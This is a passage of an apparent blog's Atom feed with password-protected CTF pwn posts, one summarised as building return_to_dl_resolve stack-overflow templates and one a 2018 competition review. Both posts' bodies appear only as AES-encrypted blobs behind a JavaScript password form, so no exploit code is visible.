872uH3qVg5+BXH2tBdLy1DJ5JbWRWRr0ex8ZP1U4CiPjqo5aEQzBrhnl0++j+aIco+zNWx/nUWiNkGJFxWFT9/2XKb7UOh71p13a0zcFIm881JfAwK+ZMHGf5dVQoQSk21vxFQChU6WH6KmaqGpzZghQ/XngRLK0lkTm3YgrsW55NMv15/tg=</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;比赛中常常会遇到基础栈溢出类的题（并且开启ASLR+DEP），写这篇文章的目的主要是构造&lt;code&gt;return_to_dl_resolve&lt;/code&gt;技术的32位与64位模板，再遇到类似的栈溢出题目时，就不必再绕很大的圈子做了，直接秒了即可。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2018_807个人赛复盘</title>
    <link href="https://winter3un.github.io/2018/08/07/20180807/"/>
    <id>https://winter3un.github.io/2018/08/07/20180807/</id>
    <published>2018-08-08T03:39:09.000Z</published>
    <updated>2018-08-11T13:40:27.781Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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